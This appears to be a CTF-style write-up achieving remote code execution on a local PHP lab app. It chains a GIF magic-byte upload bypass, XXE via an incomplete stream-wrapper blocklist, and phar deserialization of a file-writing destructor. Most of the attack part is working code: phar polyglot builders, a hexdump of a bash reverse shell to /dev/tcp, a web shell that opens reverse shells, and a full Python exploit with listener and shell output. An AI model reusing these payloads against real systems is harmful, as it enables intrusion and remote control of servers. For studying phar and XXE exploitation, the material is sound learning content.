## Goal: 
- To get an RCE

## Analysis:
### Info: 
- Language: php 
- Env: php7.4 docker container with apache webserver
- dir structure at web root: 
```shell
$ tree .
.
├── chicken.php
├── index.php
├── styles.css
├── upload.php
├── uploads
│   └── something.gif
└── view.php

1 directory, 6 files
```

### Hint: 
As seen above there is a `something.gif` inside the upload folder which I put in as a hint. i.e: 
```shell
$ xxd uploads/something.gif
00000000: 4749 4638 3961 3b3c 3f70 6870 205f 5f48  GIF89a;<?php __H
00000010: 414c 545f 434f 4d50 494c 4552 2829 3b20  ALT_COMPILER();
00000020: 3f3e 0d0a bd00 0000 0100 0000 1100 0000  ?>..............
00000030: 0100 0000 0000 8700 0000 4f3a 373a 2263  ..........O:7:"c
00000040: 6869 636b 656e 223a 323a 7b73 3a37 3a22  hicken":2:{s:7:"
00000050: 636f 6e74 656e 7422 3b73 3a37 323a 223c  content";s:72:"<
00000060: 3f70 6870 0a65 7865 6328 222f 6269 6e2f  ?php.exec("/bin/
00000070: 6261 7368 202d 6320 2762 6173 6820 2d69  bash -c 'bash -i
00000080: 203e 2620 2f64 6576 2f74 6370 2f31 3732   >& /dev/tcp/172
00000090: 2e31 372e 302e 312f 3331 3333 3720 303e  .17.0.1/31337 0>
000000a0: 2631 2722 5c29 3b22 3b73 3a34 3a22 6e61  &1'"\);";s:4:"na
000000b0: 6d65 223b 733a 353a 2264 2e70 6870 223b  me";s:5:"d.php";
000000c0: 7d08 0000 0052 6963 6b2e 7478 7417 0000  }....Rick.txt...
000000d0: 009e 0941 6017 0000 00b7 433c 0ea4 0100  ...A`.....C<....
000000e0: 0000 0000 004e 6576 6572 2067 6f6e 6e61  .....Never gonna
000000f0: 2067 6976 6520 796f 7520 7570 da58 acc4   give you up.X..
00000100: 6866 754a 0529 e397 506d 27f0 a509 9651  hfuJ.)..Pm'....Q
00000110: 0200 0000 4742 4d42                      ....GBMB
```

### Vulnerability I: bagic mytes
$WEB_ROOT/upload.php
```php
  8 // Check if image file is a actual image or fake image
  9 if(isset($_POST["submit"])) {
 10   $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]); 
 11   if($check !== false) {
 12     echo "File is an image - " . $check["mime"] . ".";
 13     $uploadOk = 1;
 14   } else {
 15     echo "File is not an image.";
 16     $uploadOk = 0;
 17   }
 18 }
 ```
 The check on the line 10 can be fooled with magic bytes. for example a php file with `GIF89a` magic bytes can bypass that check 
 
 ### Vulnerablity II: 
 $WEB_ROOT/view.php
 ```php
 15 if (isset($_GET['xmldoc'])){
 16         $content = urldecode($_GET['xmldoc']);
 17         if (preg_match('/(php|zlib|file|http|data|glob|expect):\/\//', $content)){ // [1]
 18                 echo "Naughty boy";
 19                 header("Location: ");
 20                 die();
 21                 }
 22                 else
 23                 {
 24                         $doc = simplexml_load_string($content, NULL,
 25                                 LIBXML_NOENT); // [2]
 26                         echo "If there are no errors on this then XML is parsed";
 27                 }
 28         }
 29 else {
 30                 echo "cant exploit without userinput lol, and its 'xmldoc' parameter ;) have fun";
 31 }
 32 ?>
 ```
 
 As implemented in [1] Regex isnt the best solution in this case and can easily be bypassed by a malicious actor also `phar` stream wrapper isnt blacklisted either. [2] introduces XXE as LIBXML_NOENT actually resolves the entity than disabliing(developer confusion is real even in present days). we leverage the XXE to invoke the phar polyglot we upload using `ulnerability I`
 
 ### Vulnerability II and a feature(bug? :P)
 $WEB_ROOT/chicken.php:
 ```php
  1 <?php
  2
  3 class Chicken{
  4     public function __destruct(){
  5         echo "things happened";
  6         file_put_contents($this->name, $this->content, FILE_APPEND);
  7     }
  8 }
  9
 10 ?>
 ```
Sweet line 6 just lets us write files ;p 
lets make a phar out of this: 
```php
<?php

class chicken{
        public function __construct(){
                //vars
                $this->content = "<?php phpinfo() ?>";
                $this->name = "d.php";
        }
}

//create a new phar archieve
$phar = new \Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");

//serialize
$payload = new chicken();
$phar-> setMetadata($payload);

//zip archieve inside phar file :kekw:
$phar->addFromString("Rick.txt", "Never gonna give you up");
$phar->stopBuffering();
?>
```
This bypasses the filetype check and when we invoke the phar archieve via the XXE on `Vulberability II` `d.php` is written to the webroot and then we can access it to see `phpinfo()` output proving code execution. 

so if we were to generate a phar file with: 
```php
<?php

class chicken{
        public function __construct(){
                //vars
                $this->content = '<?php $ip=$_GET[\'ip\'];$p=$_GET[\'p\'];$string="/bin/bash -c \'sh -i >& /dev/tcp/".$ip."/".$p." 0>&1\'";exec($string); ?>';
                $this->name = "nail.php";
        }
}

//create a new phar archieve
$phar = new \Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");

//serialize
$payload = new chicken();
$phar-> setMetadata($payload);

//zip archieve inside phar file :kekw:
$phar->addFromString("Rick.txt", "Never gonna give you up");
$phar->stopBuffering();
?>
```

and then use an exploit like: 
```python
import requests, sys, socket, telnetlib
from threading import Thread

def upload():
    files = {'fileToUpload' : open(f'{sys.argv[1]}', 'rb')}
    r = requests.post('http://localhost:9001/upload.php', files=files)
    if "successfully" in r.text:
        print("[-] Phar has been planted")

def exp():
    payload = f'''<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM "phar://./uploads/{sys.argv[1]}">]><lol>&test;</lol>'''
    r = requests.get("http://localhost:9001/view.php",{'xmldoc' : payload})
    if "things happened" in r.text:
        print("[-] Phar deserialized via XXE")

def handler(port):
    print(f"[-] Starting handler on {port}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',port))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[-] Connection from {addr[0]}")
    t.sock = conn
    print("[-] Shell'd")
    t.interact()

def invoke(attacker,port):
    requests.get("http://localhost:9001/nail.php",{'ip' : attacker, 'p' : port})

def main():
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} <phar polyglot> <attackerip:port>")
        sys.exit(-1)
    attacker = sys.argv[2].split(':')[0]
    port = sys.argv[2].split(':')[1]
    thr = Thread(target=handler,args=(int(port),))
    thr.start()
    upload()
    exp()
    invoke(attacker,port)

if __name__ == "__main__":
    main()

```

we get: 
```shell
$ python3 exploit.py pocsh.gif 127.0.0.1:31337
[-] Starting handler on 31337
[-] Phar deserialized via XXE
[-] Connection from 127.0.0.1
[-] Shell'd
$ id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
$
```


## References: 
- https://srcincite.io/assets/out-of-hand-attacks-against-php-environments.pdf
- https://files.ripstech.com/slides/PHP.RUHR_2018_New_PHP_Exploitation_Techniques.pdf